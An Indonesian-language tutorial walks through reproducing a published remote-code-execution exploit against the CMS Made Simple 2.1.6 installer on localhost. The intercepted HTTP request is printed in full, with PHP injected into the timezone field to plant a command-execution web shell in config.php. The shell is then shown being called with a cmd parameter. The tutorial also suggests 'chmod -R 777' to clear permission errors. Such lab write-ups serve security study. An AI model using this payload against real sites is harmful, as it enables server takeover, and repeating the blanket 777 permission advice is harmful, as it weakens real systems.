 _____ _____ __ __ _____ _____ ___ ____  _____ 
|  |  |   __|  |  |  _  |     |   |    \|   __|
|     |   __|-   -|     |   --| | |  |  |   __|
|__|__|_____|__|__|__|__|_____|___|____/|_____|


---------------------------------------------------

-- Exploit :: https://www.exploit-db.com/exploits/44192/
-- Author :: Keerati T.
-- Type :: Webapps
-- Published :: 2018-02-27
                                               
---------------------------------------------------

--- Intro{

Hallo brooooo. ok kali ini kita mau sedikit ngebahas exploit
diatas. berdasarkan judul exploitnya di exploit-db kita bisa melakukan 
RCE. mari kita coba.
}

--- Persiapan{
	
Untuk bahan bahannya silahkan download di web http://dev.cmsmadesimple.org/project/files/6. pilih yang versi 2.1.6 / bisa juga download dari mirror gw.
}

--- Go{
	
1. Ok pertama ekstract file yang udah didownload tadi 
2. Masukkan ke folder html kalian ( di tempat gw foldernya ada di /var/www/html)
3. Aktifkan service webservernya
4. Buka file tadi lewat browser ( localhost/{PATH_TEMPAT_NYIMPENNYA/NAMA_FILENYA} ).
5. Nanti akan terbuka halaman installer ( pic : Screenshot_2018-02-28_23-09-12.png )
5. Setelah itu klik next next aja

	5.a Jika Menemukan Error Write Protected / Berhubungan dengan ijin baca tulis
		cara ngefixnya tinggal kasih akses RW / Read-Write / gampangnya 
		chmod -R 777 {nama_folder}

	5.b Jika Menemukan Error XML Functionality
		cara ngefixnya tinggal : 

	sudo apt-get install php-xml

		kalo pc/laptop kalian pakai linux. terus restart webservernya

	5.c Jika menemukan error GD:Version blablabla
		cara fixnya cukup :

	apt-get install php-gd

		kalo pc/laptop kalian pakai linux. terus restart webservernya

6. Jika sudah masuk ke tahap 4. Masukkan informasi db. jika berlum silahkan buat database untuk aplikasi ini ( pic :Screenshot_2018-02-28_23-26-42.png ). tapi jangan di klik next dulu. silahkan buka burpsuite kalian

7. Jika sudah setting supaya burpsuite mau menangkap request di localhost
8. aktifkan intercept di burpsuite
9. Jika sudah kembali ke tahap instalasi
10. Silahkan klik next
11. Jika semua langkah berhasil maka akan muncul seperti di gambar ( pic : Screenshot_2018-02-28_23-34-03.png )

===========================================================================

POST /cmsms/install.php/index.php?m56cbde72=4 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://localhost/cmsms/install.php/index.php?m56cbde72=4
Content-Type: application/x-www-form-urlencoded
Content-Length: 97
Cookie: CMSIC677eca625b=s15pmup25casddvddfb04kajg0
Connection: close
Upgrade-Insecure-Requests: 1

dbhost=localhost&dbname=cmsms&dbuser=root&dbpass=123123123&timezone=z';echo%20system($_GET['cmd']);$z='z&next=Next+%E2%86%92

===========================================================================

12. Sekarang buka burpsuite kalian. terus modifikasi bagian timezone seperti diatas
13. setelah itu klik forward -> forward
14. Isi lagi form dibagian instalasi
15. next next next
16. jika instalasi berhasil kita bisa melakukan RCE melalui 

http://localhost/[PATH_INSTALASI]/config.php?cmd=

17. Mencoba melakukan perintah uname -a

http://localhost/[PATH_INSTALASI]/config.php?cmd=uname -a

(pic : Screenshot_2018-02-28_23-53-32.png )

18. dan jika kita buka file config.php inilah yang akan kita lihat
(pic : Screenshot_2018-02-28_23-43-26.png )

sekian dan terima kasih. maaf jika ada yang kurang atau salah.

./kiirin
	
}
